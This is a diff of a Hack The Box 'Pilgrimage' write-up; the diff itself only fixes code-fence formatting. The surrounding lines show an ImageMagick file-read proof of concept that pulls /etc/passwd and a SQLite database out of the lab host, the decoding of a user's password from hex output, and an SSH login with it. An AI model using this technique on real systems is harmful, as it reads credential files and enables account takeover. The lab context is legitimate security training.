@@ -74,7 +74,7 @@ Successfully installed pypng-0.20220715.0
    [>] Placing Payload to read /etc/passwd
    [>] PoC PNG generated > exploit1
 ```
-
+```
 └──╼ [★]$ sudo wget http://pilgrimage.htb/shrunk/64a32325a387c.png
 --2023-07-03 20:36:46--  http://pilgrimage.htb/shrunk/64a32325a387c.png
 Resolving pilgrimage.htb (pilgrimage.htb)... 10.129.150.112
@@ -86,8 +86,8 @@ Saving to: ‘64a32325a387c.png’
 64a32325a387c.png   100%[===================>]   1.65K  --.-KB/s    in 0s      
 
 2023-07-03 20:36:46 (195 MB/s) - ‘64a32325a387c.png’ saved [1688/1688]
-
-
+```
+```
 └──╼ [★]$ exiftool 64a32325a387c.png -b
 Warning: [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers) - 64a32325a387c.png
 12.1664a32325a387c.png.16882023:07:03 20:36:05+01:002023:07:03 20:37:46+01:002023:07:03 20:36:46+01:00644PNGPNGimage/png128128820002.20.31270.3290.640.330.30.60.150.06255 255 2552023:07:03 19:36:05
@@ -134,7 +134,8 @@ Warning: [minor] Text chunk(s) found after PNG IDAT (may be ignored by some read
 737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
 3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
 [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)2023-07-03T19:36:05+00:002023-07-03T19:36:05+00:002023-07-03T19:36:05+00:00128 1280.016384
-
+```
+```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -162,10 +163,10 @@ emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
 _laurel:x:998:998::/var/log/laurel:/bin/false
-
-
+```
+```
 └──╼ [★]$ less login.php
-
+```
 
 ```php
 <?php
@@ -183,7 +184,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['passw
   $stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");
   $stmt->execute(array($username,$password));
 ```
-
+```
 └──╼ [★]$ sudo python3 generate.py -f "/var/db/pilgrimage" -o exploit2.png
 
    [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
@@ -191,8 +192,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['passw
    [>] Blank PNG generated
    [>] Placing Payload to read /var/db/pilgrimage
    [>] PoC PNG generated > exploit2.png
-
-
+```
+```
 └──╼ [★]$ sudo wget http://pilgrimage.htb/shrunk/64a324799638f.png
 --2023-07-03 20:41:58--  http://pilgrimage.htb/shrunk/64a324799638f.png
 Resolving pilgrimage.htb (pilgrimage.htb)... 10.129.150.112
@@ -204,12 +205,12 @@ Saving to: ‘64a324799638f.png’
 64a324799638f.png   100%[===================>]   1.71K  --.-KB/s    in 0s      
 
 2023-07-03 20:41:58 (215 MB/s) - ‘64a324799638f.png’ saved [1748/1748]
-
-
+```
+```
 └──╼ [★]$ exiftool 64a324799638f.png  -b
 Warning: [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers) - 64a324799638f.png
 12.1664a324799638f.png.17482023:07:03 20:41:45+01:002023:07:03 20:41:58+01:002023:07:03 20:41:58+01:00644PNGPNGimage/png128128820002.20.31270.3290.640.330.30.60.150.06255 255 2552023:07:03 19:41:45
-
+```
 
 d02031915726f6775653170617373180103172d65
 6d696c796162696763686f6e6b79626f693132330a000000020fec000ff70fec
@@ -221,7 +222,7 @@ a031901726f6775
 65310208031709656d696c790d000000020f74000fba0f74
 
  1&öwe1	emily
-
+```
 └──╼ [★]$ ssh pilgrimage.htb -l emily
 emily@pilgrimage.htb's password: 
 Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
@@ -233,7 +234,7 @@ individual files in /usr/share/doc/*/copyright.
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 emily@pilgrimage:~$ 
-
+```
 ```
 emily@pilgrimage:~$ cat user.txt 
 d0663dd014**********************
